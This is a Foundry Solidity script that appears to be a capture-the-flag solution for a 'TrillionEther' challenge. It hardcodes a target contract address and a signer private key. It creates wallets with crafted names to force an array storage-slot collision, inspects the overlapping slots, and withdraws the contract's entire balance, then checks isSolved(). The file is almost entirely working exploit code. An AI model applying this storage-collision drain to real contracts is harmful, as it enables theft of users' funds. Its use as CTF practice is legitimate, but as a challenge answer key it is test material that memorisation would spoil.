// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/TrillionEther.sol";

contract CounterScript is Script {
    TrillionEther public te;
    address public cont;

    function setUp() public {
        cont = 0x6d240F5aeebc6fB8Cc596fE445BcA32e3f653667;
        te = TrillionEther(cont);
    }

    function alignSlot() public {
        te.createWallet(bytes32(uint256(0xf250b10ce3d189c7b8a9937227ed301291731678e7eaa7adedf0244dfb0408df) - 1));
        te.createWallet(bytes32(uint256(0x9cfb5bb78e7c347263543e1cd297dabd3c1dc12392955258989acef8a5aeb389) - 1));
        te.createWallet(bytes32(uint256(0x47a606623926df1d0dfee8c77d428567e6c86bce3d3ffd03434579a350595e34) - 1));
        te.createWallet(bytes32(uint256(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) - 1));
    }

    function run() public {
        // set the signer's private key
        vm.startBroadcast(0xabc36aba623d0038158461f5d4b1b25e16d5844f72a520716a2b02e9981e68cb);

        uint256 dest = 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563;

        alignSlot();
        uint256 goal = 0xf250b10ce3d189c7b8a9937227ed301291731678e7eaa7adedf0244dfb0408df - 1;

        unchecked {
            console.logBytes32(bytes32(dest+(3*goal)));
            bytes32 expectedSlot0 = vm.load(address(te), bytes32(dest+(3*goal)+0));
            bytes32 expectedSlot1 = vm.load(address(te), bytes32(dest+(3*goal)+1));
            bytes32 expectedSlot2 = vm.load(address(te), bytes32(dest+(3*goal)+2));
            console.logBytes32(expectedSlot0);
            console.logBytes32(expectedSlot1);
            console.logBytes32(expectedSlot2);
        }

        te.withdraw(goal, address(te).balance);
        console.log(te.isSolved());
    }
}